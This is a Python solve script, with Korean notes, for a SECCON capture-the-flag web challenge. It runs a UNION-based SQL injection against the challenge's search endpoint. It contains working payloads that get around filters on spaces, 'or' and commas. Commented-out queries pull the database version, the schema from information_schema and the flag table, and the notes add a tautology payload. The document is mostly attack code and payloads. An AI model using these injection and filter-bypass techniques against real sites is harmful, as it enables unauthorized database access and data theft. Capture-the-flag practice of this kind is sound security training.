import requests

url = "http://web-search.chal.seccon.jp/"

def bypass_filter(q):
	q = q.replace(" ", "/**/")
	q = q.replace("or", "oorr")
	return q

params = {}

# get version : 10.4.8-MariaDB-1:10.4.8+maria~bionic
#query = "g0pher' union select * from (select 3)a join (select @@version)b join (select 4)c#"


# get database : seccon_sqli
#query = "g0pher' union select * from (select 3)a join (select database())b join (select 4)c#"

# get tables : flag, articles
#query = "g0pher' union select * from (select table_name from infoorrmation_schema.tables')a join (select 3)b  join (select 5)c#"

# get culmn : flag=[piece], articles=[id, title, description, regerence, status]
#query = "g0pher' union select * from (select column_name from infoorrmation_schema.columns where table_name = 'articles')a join (select 3)b  join (select 5)c#"

# You_Win_Yeah}
#query = "g0pher' union select * from (select piece from flag)a join (select 3)b  join (select 5)c#"

# SECCON{Yeah_Sqli_Success_
#query = "g0pher' union select * from (select description from articles)a join (select 3)b  join (select 5)c#"

params['q']= bypass_filter(query)
res = requests.get(url, params = params)
if "Err" in res.text:
	print("Error")
else:
	print(res.text)
print(params['q'])

# SECCON{Yeah_Sqli_Success_You_Win_Yeah}

'''
1. 처음에 이것저것 넣어보다가 공백과 or가 필터링 되어있는걸 발견
2. 공백은 /**/로, or는 oorr로 bypass가 가능
3. 이를 이용해서 ' union select 1 했는데 에러가 뜸. -> 컬럼수 다를거라 예상
4. ' union select 1,2 형태로 했더니 이런,,, 쉼표가 필터링 되어있음.
5. 한참 고민하다가 select * from (select 1)a join (select 2)b 형태로 쉼표 우회.
6. 컬럼수는 3이었음. -> join 3번.
6. 위 코드에서 보이는 쿼리 순차적으로 넣음 


풀고나니 문제의 의도가 이게 아니었다는걸 깨달음.
1. '/**/oorr/**/1# 이렇게 알게된 우회방법으로 모두 출력해봄.
2. The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. Try more!
3. 위 문구를 발견하면 "아하! flag라는 테이블에 뭐가 있구나. 하고 저 테이블을 열람하는것인듯,,

'''